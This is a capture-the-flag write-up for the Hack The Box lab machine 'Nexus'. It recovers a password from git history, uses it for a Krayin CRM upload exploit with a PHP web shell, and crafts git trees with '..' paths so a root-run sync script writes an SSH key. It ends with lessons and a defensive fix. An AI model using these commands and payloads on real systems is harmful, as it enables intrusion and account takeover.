# Nexus — Hack The Box, Linux

**TL;DR:** A hidden Gitea vhost serves a repo whose git *history* still holds a
database password. That password is reused as a CRM admin login, the CRM has an
unauthenticated-upload CVE, the production `.env` gives a second password reused
for SSH, and a root-run "template sync" script joins attacker-controlled paths
onto a staging directory — so a git tree containing `../../../../../root/.ssh/authorized_keys`
gets written by root once a minute.

## Reconnaissance

    nmap -Pn -sCV -p22,80 10.129.x.x

    22/tcp open  ssh   OpenSSH 9.6p1 Ubuntu 3ubuntu13.16
    80/tcp open  http  nginx 1.24.0 (Ubuntu)
    |_http-title: Did not follow redirect to http://nexus.htb/

Two ports, and that last line is the whole opening move. The web server answers
the raw IP with a 302 to a hostname, which means the real application is
virtual-host gated — anything I fuzz against `10.129.x.x` will just bounce.
Adding `nexus.htb` to `/etc/hosts` gets me a static "Nexus Energy Authority"
brochure site with two contact addresses, `careers@nexus.htb` and
`j.matthew@nexus.htb`, and nothing else.

A brochure site on a box with only 22 and 80 open is a strong hint that the
interesting surface is on another vhost. A wrong `Host` header returns the
302 (154 bytes), which gives me a clean filter:

    ffuf -u http://10.129.x.x/ -H 'Host: FUZZ.nexus.htb' \
         -w subdomains-top1million-20000.txt -fs 154

    git
    billing

`git.nexus.htb` is a Gitea 1.26.0 instance. `billing.nexus.htb` redirects to
`/admin/login` and is Krayin CRM, a Laravel application.

## Enumeration

Gitea's API answers without credentials, which saves a lot of clicking:

    curl -s 'http://git.nexus.htb/api/v1/repos/search?limit=50' | jq -r '.data[].full_name'
    admin/krayin-docker-setup

    curl -s 'http://git.nexus.htb/api/v1/users/search?limit=50' | jq -r '.data[].login'
    admin
    jones

One public repo, two users. Cloning it, the `.env` looks disappointing —
`DB_PASSWORD=` is empty. But there are two commits, and the diff is the point:

    git diff 1615c46 9b817fa -- .env

    -APP_URL=http://nexus.htb
    +APP_URL=http://billing.nexus.htb
    -DB_PASSWORD=N27xh!!2ucY04
    +DB_PASSWORD=

Somebody committed the password, noticed, and blanked it in the next commit.
That does not remove it; it just moves it one commit back. This is why "look at
what was deleted" is the first thing to do with any repository you recover — the
scrubbing commit is a signpost pointing at the secret, not a fix.

The password does not work on Gitea or SSH. It is a *database* password, so the
question is which application uses that database — and the repo is literally
named `krayin-docker-setup`, with `APP_URL` updated to `billing.nexus.htb` in
the same commit.

## Foothold

Krayin's login takes an email. The site footer gave me one:

    j.matthew@nexus.htb : N27xh!!2ucY04

That works. The database password is also the CRM admin password.

Krayin CRM 2.2.0, and `searchsploit` has an exact match:

    searchsploit krayin
    Krayin CRM v2.2.x - Authenticated Remote Code Execution | multiple/webapps/52629.py

Reading the exploit before running it — always, and doubly so for anything that
uploads to a target — it turns out to be about fifteen lines of real logic:
log in, grab the `XSRF-TOKEN` cookie, and POST a file to
`/admin/tinymce/upload` with `Content-Type: image/jpeg`. The endpoint trusts the
declared MIME type and never looks at the extension. CVE-2026-38526.

I reproduced it with curl rather than running someone else's script against the
box:

    echo '<?php system($_REQUEST["c"]); ?>' > sh.php
    curl -b jar -X POST http://billing.nexus.htb/admin/tinymce/upload \
      -H "X-XSRF-TOKEN: $XSRF" -F "file=@sh.php;type=image/jpeg"

    {"location":"http://billing.nexus.htb/storage/tinymce/fbd16a...php"}

It hands you the URL of your own web shell:

    $ curl 'http://billing.nexus.htb/storage/tinymce/fbd16a...php?c=id'
    uid=33(www-data) gid=33(www-data) groups=33(www-data)

`/home` has `jones` and `git`, and the box is `nexus` itself — despite the repo
being a docker-compose setup, the CRM is running on the host.

The first thing to read as `www-data` on a Laravel box is always the live
`.env`, because it is the config the repo was pretending to be:

    DB_PASSWORD=y27xb3ha!!74GbR

A *different* password from the one in git. And it is `jones`'s SSH password:

    jones@nexus:~$ cat user.txt
    <user flag redacted>

It is also his Gitea password — which matters more than the shell does, though
I did not know that yet.

## Privilege escalation

`jones` has nothing: `sudo -l` wants a password, capabilities are stock, the
SUID list is stock. What is not stock is `/etc/gitea/`:

    -rw-r-----  1 git  git  1586  app.ini
    -rw-r-----  1 git  git    89  template-sync.conf
    -rw-r--r--  1 git  git  4184  template-sync.py

The two config files are unreadable, but the script is world-readable, and a
custom script is worth more than either config. It fetches every Gitea repo
flagged as a template and extracts its files to a staging directory:

    stage_path = os.path.join(STAGING_DIR, owner, name)
    ...
    for mode, objhash, filepath in entries:
        target = os.path.join(stage_path, filepath)
        os.makedirs(os.path.dirname(target), exist_ok=True)
        ...
        with open(target, 'wb') as f:
            f.write(cat_result.stdout)

`filepath` comes from `git ls-tree -r HEAD` of a repository. There is no
`realpath`, no containment check, no normalisation. Whoever controls a template
repo controls where this writes. The only question is who runs it:

    $ cat /etc/systemd/system/gitea-template-sync.service
    User=root
    ExecStart=/usr/bin/python3 /etc/gitea/template-sync.py

    $ ls -la /var/log/template-sync.log
    -rw-r--r-- 1 root root ... /var/log/template-sync.log

Root, and the timer fires every 60 seconds.

Gitea self-registration is disabled (403), which is exactly why the third
credential reuse mattered — `jones` on Gitea is enough to create a repo and flag
it as a template via the API:

    curl -u jones:'...' -X POST .../api/v1/user/repos -d '{"name":"nexus-template-audit"}'
    curl -u jones:'...' -X PATCH .../api/v1/repos/jones/nexus-template-audit -d '{"template":true}'

Now the interesting part. Git will not let you build a path containing `..`
through the index — `git add` rejects it. But the index is a convenience layer;
tree objects are just name-to-hash mappings, and `git mktree` writes them
directly. So I built the tree from the inside out:

    BLOB=$(cat rootkey.pub | git hash-object -w --stdin)
    T=$(printf '100644 blob %s\tauthorized_keys\n' "$BLOB" | git mktree)
    T=$(printf '040000 tree %s\t.ssh\n' "$T" | git mktree)
    T=$(printf '040000 tree %s\troot\n' "$T" | git mktree)
    for i in 1 2 3 4 5; do T=$(printf '040000 tree %s\t..\n' "$T" | git mktree); done
    C=$(echo audit | git commit-tree "$T")
    git update-ref refs/heads/main "$C"

Five levels, because staging is `/home/git/template-staging/<owner>/<name>` and
I need to climb out to `/`. The result reads back exactly as the sync script
will see it:

    $ git ls-tree -r HEAD
    100644 blob 61e573be...    ../../../../../root/.ssh/authorized_keys

Gitea accepted the push without running fsck on the incoming objects, and a
minute later:

    [2026-08-01 04:07:08] Found 1 template repo(s)
    [2026-08-01 04:07:08] Syncing template: jones/nexus-template-audit
    [2026-08-01 04:07:08]   synced: ../../../../../root/.ssh/authorized_keys

Root wrote my key into its own `authorized_keys`, and `os.makedirs` helpfully
created `/root/.ssh` on the way:

    $ ssh -i rootkey root@10.129.x.x
    root@nexus:~# id
    uid=0(root) gid=0(root) groups=0(root)
    root@nexus:~# cat /root/root.txt
    <root flag redacted>

## What did not work

**The git-history password anywhere but the CRM.** I tried `N27xh!!2ucY04`
against the Gitea API for both `admin` and `jones`, and against SSH for `jones`,
`admin` and `j.matthew`, before trying the CRM. All rejected. Ruling it out took
a minute and made the CRM hit meaningful rather than lucky.

**Gitea self-registration.** The `/user/sign_up` page returns 200, which looks
promising, but the POST returns 403 and no CSRF token is issued — registration
is off. If I had not already had `jones`'s Gitea password from the `.env`
reuse, this is where the box would have stalled, and I would have gone looking
for the API token in `template-sync.conf` instead.

**MySQL as a lateral path.** I dumped the `krayin` database expecting more
users; there is exactly one, `james`, with a bcrypt hash. Gitea turned out to
use SQLite, and `/var/lib/gitea` is not readable as `jones`. Dead end, two
minutes.

**`/opt/forge/app/.env`.** The sync script reads its config from two paths, and
the second one does not exist — `/opt` is empty and root-owned. Briefly
promising (if I could write it, I would control the API token) but I had no
write access there, and controlling the token would not have granted a write
primitive anyway.

## Lessons

When a repository's HEAD looks clean, diff it. A blanked secret is evidence that
there *was* a secret, and it names the commit for you. `git log -p -- .env` is
the ten-second version of this.

The application's real config always beats the repository's. The git leak gave
me a password that opened one door; `/var/www/*/.env` on the box gave me a
different password that opened three. Reading live config is the first move
after any web-shell foothold.

`git mktree` builds tree objects the index refuses to. Any tool that consumes
`git ls-tree` output as a filesystem path — sync scripts, CI extractors,
deployment jobs, archive builders — should be assumed vulnerable to path
traversal until it demonstrates a `realpath` containment check, because the
usual "git won't let you do that" intuition is about porcelain, not plumbing.

## Defensive takeaway

The chain has six distinct failures, and the one that mattered is the least
glamorous: a maintenance script running as root that trusts a path from a data
source ordinary users can write. Fixing the CVE, rotating the leaked password
and purging git history all leave that primitive in place, re-arming every
sixty seconds.

Two lines fix it — `os.path.realpath` plus a `startswith` check on the staging
directory — and the correct fix is arguably even simpler: the job reads a bare
repo and writes to a staging directory, so it never needed uid 0 at all. The
recurring pattern across both machines I ran this week is the same. The
vulnerability that gets the CVE number is rarely the one that decides how bad
the day gets; that one is usually a local privilege boundary somebody widened
for convenience.
